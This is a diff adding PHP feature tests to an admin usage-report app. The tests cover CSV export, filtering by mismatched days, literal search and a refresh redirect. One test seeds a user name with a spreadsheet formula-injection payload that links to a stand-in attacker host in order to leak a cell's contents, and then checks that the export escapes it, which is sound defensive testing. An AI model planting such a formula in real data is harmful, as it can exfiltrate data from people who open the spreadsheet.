@@ -102,3 +102,46 @@ it('exports the current view as exact CSV', function () {
 
     expect($csv)->toContain('2026-11-04,1,0,0,0.381887500,0.305510000,0.076377500,0.305510000,yes');
 });
+
+it('keeps user-typed text in the CSV from running as a spreadsheet formula', function () {
+    $mallory = User::factory()->create(['name' => '=HYPERLINK("https://evil.test?"&C2,"Click")', 'email' => 'm@example.com']);
+    finished($mallory, '2026-11-04 10:00:00', 100_000_000);
+    Http::fake(['*/v1/usage*' => Http::response(['data' => [usageDay('2026-11-04', 1, '0.100000000')]])]);
+
+    $csv = $this->actingAs($this->admin)->get('/admin/report/export?tab=users&from=2026-11-04&to=2026-11-04')->streamedContent();
+
+    expect($csv)->toContain('"\'=HYPERLINK(')->not->toContain(',"=HYPERLINK(');
+});
+
+it('never counts a day it could not compare as a mismatch', function () {
+    finished($this->ann, now()->toDateTimeString(), 100_000_000);
+    Http::fake(['*/v1/usage*' => Http::response(['error' => ['code' => 'overloaded']], 503)]);
+
+    $this->actingAs($this->admin)->get('/admin/report?mismatches=1')
+        ->assertInertia(fn ($page) => $page->where('summary.mismatched_days', 0)->where('days.data', []));
+});
+
+it('exports only mismatching days when the view is filtered to them', function () {
+    finished($this->ann, '2026-11-04 10:00:00', 100_000_000);
+    finished($this->ann, '2026-11-05 10:00:00', 100_000_000);
+    Http::fake(['*/v1/usage*' => Http::response(['data' => [usageDay('2026-11-04', 1, '0.100000000'), usageDay('2026-11-05', 1, '0.200000000')]])]);
+
+    $csv = $this->actingAs($this->admin)->get('/admin/report/export?from=2026-11-04&to=2026-11-05&mismatches=1')->streamedContent();
+
+    expect($csv)->toContain('2026-11-05')->not->toContain('2026-11-04');
+});
+
+it('searches literally: "0" counts, and % is not a wildcard', function () {
+    User::factory()->create(['name' => 'Agent 0', 'email' => 'zero@example.com']);
+
+    $this->actingAs($this->admin)->get('/admin/users?q=0')->assertInertia(fn ($page) => $page->has('users.data', 1));
+    $this->actingAs($this->admin)->get('/admin/users?q=%25')->assertInertia(fn ($page) => $page->has('users.data', 0));
+});
+
+it('rechecks Pixelforge once, then drops refresh from the address', function () {
+    Http::fake(['*/v1/usage*' => Http::response(['data' => []])]);
+
+    $this->actingAs($this->admin)->get('/admin/report?from=2026-11-04&to=2026-11-04&refresh=1')
+        ->assertRedirect('/admin/report?from=2026-11-04&to=2026-11-04');
+    Http::assertSentCount(1);
+});
